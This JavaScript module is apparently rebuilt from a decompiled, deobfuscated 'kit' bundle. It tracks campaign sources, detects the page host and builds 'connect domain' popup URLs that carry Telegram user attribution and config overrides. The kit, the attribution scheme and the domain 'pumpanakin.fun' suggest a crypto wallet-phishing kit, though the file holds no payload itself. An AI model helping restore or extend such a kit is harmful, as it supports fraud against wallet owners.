/**
 * rebuilt/page/params.js
 *
 * Campaign source, page host, and connect URL parameter helpers.
 *
 * Sources:
 *   - decompiled/kit/page/page_params.js (readCampaignSource, pageHost)
 *   - bundle.deobfuscated.js lines 17584–17610 (恶, 訥, 屌, 讜)
 *   - AUDIT_AND_ROADMAP.md (B8 — connect URL full format with cd= and o=)
 *
 * Connect domain popup URL (FULL FORMAT — B8 fix):
 *   https://{connectDomain}/connect/{token}?b=1[&cd={...}][&o={...}]
 *
 *   b=1: suppresses /api/visit beacon on connect domain (avoid double-beaconing)
 *   cd=: base-X encoded "tgid-tgus" — Telegram attribution threading
 *   o=:  base-X encoded JSON.stringify(overrides) — inline config overrides
 *
 * ?b= suppression in visit.js: the visit beacon is skipped when
 *   location.search.includes("b=") — catches ?b=1 from the connect redirect.
 */

'use strict';

const { baseXEncode, baseXDecode, SLUG_ALPHABET } = require('../core/crypto');

// ── Storage helpers ─────────────────────────────────────────────────────
const SOURCE_KEY = '_0x6';

function storageGet(key) {
  try { return JSON.parse(localStorage.getItem(key)); } catch { return null; }
}
function storageSet(key, value) {
  try { localStorage.setItem(key, JSON.stringify(value)); } catch { /* ignore */ }
}

// ── Slug helpers ─────────────────────────────────────────────────────────
// 訥(str): UTF-8 → base-X slug (used for ?cd= and ?o=)
function encodeToSlug(str) {
  return baseXEncode(new TextEncoder().encode(str), SLUG_ALPHABET);
}
// 屌(slug): base-X slug → UTF-8 string
function decodeFromSlug(slug) {
  return new TextDecoder().decode(baseXDecode(slug, SLUG_ALPHABET));
}

// ── Regexes (from decompiled/kit/page/page_params.js) ────────────────────
const SOURCE_VALID  = /^[ -~]{2,256}$/;
const REFERRER_HOST = /https?:\/\/([a-z.-]+)/i;
const D_PARAM       = /&d=([a-z\d_-]+)/;
const CONNECT_PATH  = /^\/connect\/\??([a-z\d_-]+)/;
const URL_HOST      = /^https?:\/\/([^/:]+)(:\d+)?\//;

// ── readCampaignSource() — 鼄 ────────────────────────────────────────────
// Priority: localStorage["_0x6"] > ?utm_source > referrer host
function readCampaignSource() {
  const cached = storageGet(SOURCE_KEY);
  if (cached) return cached;

  let source = new URLSearchParams(location.search).get('utm_source') ?? undefined;
  if (!source && document.referrer) {
    source = REFERRER_HOST.exec(document.referrer)?.[1];
  }
  if (source && SOURCE_VALID.test(source)) {
    storageSet(SOURCE_KEY, source);
    return source;
  }
  return undefined;
}

// ── pageHost() — 浚 ──────────────────────────────────────────────────────
// Priority: ?&d= slug > /connect/ path > hostname (minus www.)
function pageHost() {
  const { hostname, search, pathname } = location;
  const dMatch = D_PARAM.exec(search);
  if (dMatch) {
    try { return stripWww(decodeFromSlug(dMatch[1])); } catch { /* fall through */ }
  }
  const cMatch = CONNECT_PATH.exec(pathname + search);
  if (cMatch) {
    try {
      const urlMatch = URL_HOST.exec(
        typeof document !== 'undefined' ? document.URL : location.href
      );
      return stripWww(urlMatch?.[1] ?? hostname);
    } catch { /* fall through */ }
  }
  return stripWww(hostname);
}

function stripWww(host) {
  return host && host.startsWith('www.') ? host.slice(4) : host;
}

// ── generateConnectToken(pageHost): encode the page host as a slug ────────
// This is what the connect domain uses to know the apiHost.
// Verified: baseXEncode(UTF-8("pumpanakin.fun")) = "rvl-7raj_dhlbkx5c4dqrf"
function generateConnectToken(host) {
  return baseXEncode(new TextEncoder().encode(host), SLUG_ALPHABET);
}

// ── readConnectToken(slug): reverse ─────────────────────────────────────
function readConnectToken(slug) {
  return new TextDecoder().decode(baseXDecode(slug, SLUG_ALPHABET));
}

// ── buildConnectUrl(connectDomain, pageHostStr, tgUser, overrides) ───────
// FULL connect URL format with all params (B8 fix):
//   https://{connectDomain}/connect/{token}?b=1[&cd={...}][&o={...}]
function buildConnectUrl(connectDomain, pageHostStr, tgUser, overrides) {
  const token = generateConnectToken(pageHostStr);
  let url = 'https://' + connectDomain + '/connect/' + token + '?b=1';

  // Append ?cd= if we have Telegram attribution
  if (tgUser && (tgUser.tgid !== undefined || tgUser.id !== undefined)) {
    const tgid = tgUser.tgid ?? tgUser.id ?? '';
    const tgus = tgUser.tgus ?? tgUser.username ?? '';
    if (tgid) url += '&cd=' + encodeToSlug(String(tgid) + '-' + (tgus || ''));
  }

  // Append ?o= if we have config overrides
  if (overrides && typeof overrides === 'object' && Object.keys(overrides).length > 0) {
    url += '&o=' + encodeToSlug(JSON.stringify(overrides));
  }

  return url;
}

// ── readConnectParams(): parse cd= and o= on connect domain ──────────────
// Called on the connect domain to recover tgUser attribution and overrides.
function readConnectParams() {
  const params = new URLSearchParams(location.search);
  let tgUser   = null;
  let overrides = {};

  const cdVal = params.get('cd');
  if (cdVal) {
    try {
      const decoded = decodeFromSlug(cdVal);
      const [tgidStr, tgus] = decoded.split('-');
      const tgid = Number(tgidStr);
      if (!Number.isNaN(tgid)) {
        tgUser = { tgid, tgus: tgus || undefined };
      }
    } catch { /* ignore malformed */ }
  }

  const oVal = params.get('o');
  if (oVal) {
    try { overrides = JSON.parse(decodeFromSlug(oVal)); } catch { /* ignore */ }
  }

  return { tgUser, overrides };
}

module.exports = {
  readCampaignSource,
  pageHost,
  stripWww,
  generateConnectToken,
  readConnectToken,
  buildConnectUrl,
  readConnectParams,
  encodeToSlug,
  decodeFromSlug,
  storageGet,
  storageSet,
  SOURCE_KEY,
};
